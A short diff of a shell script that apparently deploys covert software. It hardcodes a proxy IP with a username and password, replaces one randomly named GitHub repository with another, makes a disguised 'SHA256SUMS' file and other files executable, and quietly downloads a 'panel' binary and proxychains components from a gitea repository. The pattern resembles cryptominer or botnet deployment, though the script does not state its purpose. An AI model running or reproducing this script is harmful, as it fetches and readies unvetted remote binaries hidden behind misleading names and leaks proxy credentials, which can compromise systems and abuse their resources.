@@ -2,7 +2,7 @@ proxy="38.154.227.167"
 port="5868" 
 user="ugursfso"  
 pass="wqn60pnk6m95" 
-git clone https://github.com/balma1/kincro.git && cd kincro && chmod +x SHA256SUMS && chmod +x config.json && chmod +x kincro
+git clone https://github.com/OpUiajwk/opoiyy.git && cd opoiyy && chmod +x SHA256SUMS && chmod +x config.json && chmod +x ebiy
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
